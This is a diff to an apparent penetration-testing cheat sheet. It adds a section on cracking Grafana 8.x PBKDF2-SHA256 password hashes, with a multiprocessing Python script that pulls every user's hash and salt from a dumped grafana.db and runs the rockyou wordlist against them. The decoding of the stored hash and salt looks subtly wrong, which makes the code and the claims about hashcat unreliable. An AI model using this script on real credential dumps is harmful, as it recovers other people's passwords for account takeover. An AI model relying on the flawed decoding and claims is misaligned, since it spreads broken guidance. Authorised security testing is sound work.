@@ -50,6 +50,34 @@ hashcat -m 1000 ntlm.txt -a 1 wordlist1.txt wordlist2.txt
 hashcat -m 1000 ntlm.txt --show
 ```
 
+### Grafana PBKDF2-SHA256 (dklen=50 -- hashcat/john miss this)
+
+> **Grafana 8.x hashes use `PBKDF2-HMAC-SHA256(pw, salt, 10000, dklen=50)`.
+> Hashcat mode 10900 defaults to `dklen=32`; john's PBKDF2-HMAC-SHA256 format has the same mismatch.
+> Both will silently fail even with the correct password. Skip standard crackers; use Python:**
+
+```python
+# crack_grafana.py -- parallelised PBKDF2-SHA256 dklen=50
+import sqlite3, base64, hashlib, multiprocessing
+
+def check(args):
+    pw, salt_b64, stored_b64 = args
+    derived = hashlib.pbkdf2_hmac(
+        'sha256', pw.encode(), base64.b64decode(salt_b64), 10000, dklen=50)
+    return pw if derived == base64.b64decode(stored_b64) else None
+
+conn = sqlite3.connect('grafana.db')
+for login, pw_b64, salt_b64 in conn.execute("SELECT login,password,salt FROM user"):
+    args = [(w.strip(), salt_b64, pw_b64)
+            for w in open('/usr/share/wordlists/rockyou.txt', errors='ignore')]
+    with multiprocessing.Pool() as pool:
+        for r in pool.imap_unordered(check, args, chunksize=1000):
+            if r:
+                print(f"{login}: {r}"); break
+```
+
+> hashcat `sha256:10000:<b64salt>:<b64hash>` mode 10900 -- still worth a fast first attempt (seconds); expect failure on stock Grafana 8.x.
+
 ## john
 
 ```bash
